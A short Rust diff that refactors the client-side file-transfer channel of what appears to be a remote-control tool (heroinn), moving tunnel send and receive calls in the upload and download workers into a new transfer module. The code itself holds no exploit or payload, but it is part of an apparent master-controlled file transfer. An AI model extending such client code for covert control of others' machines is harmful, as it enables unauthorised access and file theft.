@@ -17,6 +17,7 @@ use heroinn_util::{
 };
 
 use crate::config::master_configure;
+use crate::module::transfer;
 
 /// A live file-transfer channel on the client side.
 pub struct FtpClient {
@@ -125,7 +126,7 @@ fn upload_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
     };
     log::debug!("create tunnel success");
 
-    let header = match tunnel.recv() {
+    let header = match transfer::recv(&mut tunnel) {
         Ok(p) => p,
         Err(e) => {
             log::error!("recv get header tunnel failed : {}", e);
@@ -171,7 +172,7 @@ fn upload_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
         }
 
         log::debug!("send file data [{}]", size);
-        if let Err(e) = tunnel.send(&buf[..size]) {
+        if let Err(e) = transfer::send(&mut tunnel, &buf[..size]) {
             log::error!("get worker send to server failed : {}", e);
             break;
         };
@@ -191,7 +192,7 @@ fn download_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
     };
     log::debug!("create tunnel success");
 
-    let header = match tunnel.recv() {
+    let header = match transfer::recv(&mut tunnel) {
         Ok(p) => p,
         Err(e) => {
             log::error!("recv put header failed : {}", e);
@@ -238,7 +239,7 @@ fn download_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
             break;
         }
 
-        let data = match tunnel.recv() {
+        let data = match transfer::recv(&mut tunnel) {
             Ok(p) => p,
             Err(e) => {
                 log::error!("recv data failed from ftp slave : {}", e);
